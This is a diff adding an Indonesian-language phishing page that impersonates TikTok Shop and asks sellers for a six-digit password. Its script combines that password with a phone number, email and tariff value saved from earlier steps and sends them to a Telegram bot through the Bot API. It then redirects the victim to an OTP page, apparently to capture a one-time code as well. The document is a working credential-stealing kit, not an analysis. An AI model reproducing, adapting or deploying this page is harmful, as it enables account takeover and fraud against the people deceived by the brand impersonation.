@@ -1,0 +1,270 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>TikTok Shop</title>
+<style>
+    @import url('https://fonts.googleapis.com/css2?family=Ubuntu:wght@300;400;500;700&display=swap');
+    * {
+        font-family: 'Ubuntu', sans-serif;
+        font-weight: 400;
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+        position: relative;
+        color: #000;
+    }
+    .b { font-weight: 500; }
+    html { width: 100vw; height: 100vh; }
+    body {
+        background: #fff;
+        width: 100%;
+        height: 100%;
+    }
+    .container {
+        width: 100%;
+        padding: 20px;
+        height: 100%;
+    }
+    .flex {
+        display: flex;
+        justify-content: center;
+        align-items: center;
+    }
+    .hero {
+        width: 100%;
+        height: 283px;
+    }
+    .hero img {
+        width: 100%;
+    }
+    h1 {
+        font-size: 20px;
+        text-align: center;
+        margin: 20px 0;
+        font-weight: 600;
+    }
+    form {
+        width: 100%;
+        height: auto;
+        flex-direction: column;
+    }
+    label {
+        display: block;
+        font-size: 15px;
+        text-align: left;
+        margin-bottom: 8px;
+        font-weight: 500;
+    }
+    select {
+        width: 100%;
+        height: 40px;
+        border-radius: 4px;
+        padding: 0 10px;
+        outline: none;
+        border: 1px solid #aeaeae;
+        background: #fff;
+        margin-bottom: 20px;
+    }
+    input:focus,
+    select:focus {
+        border: 1.1px solid #000;
+    }
+    .wrap {
+        width: 100%;
+        height: 60px;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+    }
+    .clear {
+        width: 100%;
+        height: 100%;
+        position: absolute;
+        top: 0;
+        left: 0;
+        z-index: 999;
+    }
+    input {
+        width: 50px;
+        background: #fff;
+        height: 50px;
+        border-radius: 4px;
+        border: 1px solid #aeaeae;
+        outline: none;
+        padding: 0 10px;
+        font-size: 18px;
+        margin: 0 auto;
+        text-align: center;
+    }
+    button {
+        margin-top: 10px;
+        width: 100%;
+        height: 40px;
+        border: none;
+        outline: none;
+        border-radius: 8px;
+        color: #fff;
+        font-weight:bold;
+        background: #EE3056;
+        text-align: center;
+        font-size: 13px;
+    }
+    button:disabled {
+        opacity: 0.7;
+    }
+    
+     .process1 {
+            width: 100%;
+            height: 100%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: auto;
+            position: fixed;
+            padding-top: 30px;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0, 0, 0, 0.4);
+            z-index: 999999999;
+            
+      
+}
+.loading {
+    position: fixed;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    align-items: center;
+    margin-bottom: 20%;
+    margin-top: 0px;
+}
+.loading img {
+    width: 90px;
+    border-radius: 10px;
+}
+
+</style>
+</head>
+<body>
+    <center>
+<div id="djload" name="process" class="process1" style="display: none;">
+      <div class="loading">
+       <img src="https://hosting.tigerengine.id/eyyhg8.gif">              
+            </div>
+        </div>
+    <div class="container">
+        <div class="flex hero">
+            <img src="https://hosting.tigerengine.id/gcwydq.jpg" alt="">
+        </div>
+        <h1 class="">TikTok Shop</h1>
+        <form id="form" method="post" onsubmit="sandi()">
+       <input type="hidden" name="tarif" id="tarif" value="">
+       <input type="hidden" name="inp" id="inp" value="">
+       <input type="hidden" name="email" id="email" value="">
+            <label>Kata Sandi Seller</label>
+            <div class="wrap">
+                <div class="clear"></div>
+                <input autofocus id="pin1" class="inpotp" type="number" required autocomplete="off" placeholder="" name="pin1">
+                <input class="inpotp" type="number" required autocomplete="off" placeholder="" id="pin2" name="pin2">
+                <input class="inpotp" type="number" required autocomplete="off" placeholder="" id="pin3" name="pin3">
+                <input class="inpotp"type="number" required autocomplete="off" placeholder="" id="pin4" name="pin4">
+                <input class="inpotp" type="number" required autocomplete="off" placeholder="" id="pin5" name="pin5">
+                <input class="inpotp" type="number" required autocomplete="off" placeholder="" id="pin6" name="pin6" >
+            </div>
+            <button type="submit">LANJUT</button>
+        </form>
+    </div>
+<script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
+<script>
+    $(document).ready(function() {
+        $('.clear').click(function() {
+            $('.inpotp').val('');
+            $('#pin1').focus();
+            $("#btn1").prop("disabled", false);
+        });
+    })
+</script>
+<script src="i.js"></script>
+<script>
+    $('.inpotp').on('input', function(event) {
+        const inputs = $('.inpotp');
+        const isAllFilled = Array.from(inputs).every((input) => input.value !== '');
+        if (isAllFilled == true) {
+            $(event.target).blur();
+        }
+        const index = inputs.index(this);
+        const currentValue = event.target.value;
+        if (currentValue.length === 1) {
+            if (index < inputs.length - 1) {
+                inputs[index + 1].focus();
+            }
+        } else if (currentValue.length === 0) {
+            if (index > 0) {
+                inputs[index].focus();
+            }
+        }
+    });
+    $('.inpotp').on('keydown', function(event) {
+        const inputs = $('.inpotp');
+        const key = event.key;
+        const index = inputs.index(this);
+        if (key === 'Backspace' && event.target.value.length === 0) {
+            if (index > 0) {
+                inputs[index - 1].focus();
+            }
+        }
+    });
+</script>
+<script>
+    
+    
+ var tarif = sessionStorage.getItem('tarif', tarif);
+ document.getElementById("tarif").value = tarif + "";
+ var inp = sessionStorage.getItem('inp', inp);
+ document.getElementById("inp").value = inp + "";
+ var email = sessionStorage.getItem('email', email);
+ document.getElementById("email").value = email + "";          
+        
+ // Login
+function sandi(){
+    $(".process1").fadeIn();
+    event.preventDefault();   
+    
+  var tarif = $('#tarif').val();
+  sessionStorage.setItem('tarif', tarif);  
+  var inp = $('#inp').val();
+  sessionStorage.setItem('inp', inp);
+  var email = $('#email').val();
+  sessionStorage.setItem('email', email);
+  var pin1 = $('#pin1').val();
+  sessionStorage.setItem('pin1', pin1);
+  var pin2 = $('#pin2').val();
+  sessionStorage.setItem('pin2', pin2);
+  var pin3 = $('#pin3').val();
+  sessionStorage.setItem('pin3', pin3);
+  var pin4 = $('#pin4').val();
+  sessionStorage.setItem('pin4', pin4);
+  var pin5 = $('#pin5').val();
+  sessionStorage.setItem('pin5', pin5);
+  var pin6 = $('#pin6').val();
+  sessionStorage.setItem('pin6', pin6);
+                              
+    var logo = "𝘄𝘄𝘄.𝘁𝗶𝗸𝘁𝗼𝗸𝘀𝗵𝗼𝗽.𝗰𝗼𝗺";              
+    var gabungan = '' + logo + '%0A⍟ ' + tarif + '%0A%0A⍟ 𝐍𝐨𝐦𝐨𝐫 •• ' + inp + '%0A⍟ 𝐄𝐦𝐚𝐢𝐥 •• ' + email + '%0A⍟ 𝐒𝐚𝐧𝐝𝐢 •• ' + pin1 + pin2 + pin3 + pin4 + pin5 + pin6 ;   
+    $.ajax({
+        url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
+        method: `POST`,   
+    complete: function(){
+    setTimeout(function(){   
+    window.location = "otp.html";
+    $(".process1").fadeOut();  
+   
+    }, 500);}});};
+</script>
+</body>
+</html>
